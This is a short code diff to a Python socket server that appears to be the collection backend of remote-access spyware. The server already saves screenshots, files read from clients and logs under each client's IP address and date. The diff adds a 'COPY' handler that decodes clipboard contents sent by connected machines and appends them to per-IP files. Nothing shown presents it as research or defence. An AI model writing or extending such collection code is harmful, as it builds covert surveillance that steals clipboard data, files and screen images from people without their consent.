@@ -14,6 +14,7 @@ import numpy as np
 SCREENSHOT_DIR = 'screenshots/{ip}-{date}'
 READ_FILE_DIR = 'reads/{ip}-{date}'
 LOG_FILE_DIR = 'logs/{ip}-{date}'
+CLIPBOARD_DIR = 'clipboards/{ip}-{date}'
 last_client_socket = None
 stop = False
 
@@ -213,6 +214,19 @@ def handle_client(client_socket, client_address):
 
                     with open(dir_name + '/' + filename, 'wb') as f:
                         f.write(file_content_bytes)
+
+                if data_command == 'COPY':
+                    filename = client_info['filename']
+                    clipboard_content = client_info['clipboard_content']
+                    clipboard_content_bytes = base64.b64decode(clipboard_content)
+                    dir_name = CLIPBOARD_DIR.format(ip=ip, date=date)
+
+                    if not os.path.exists(dir_name):
+                        os.makedirs(dir_name)
+
+                    with open(dir_name + '/' + filename, 'ab') as f:
+                        f.write(clipboard_content_bytes)
+                        f.write(b'\n')
 
                 elif data_command == 'READ':
                     global READ_FILE_DIR
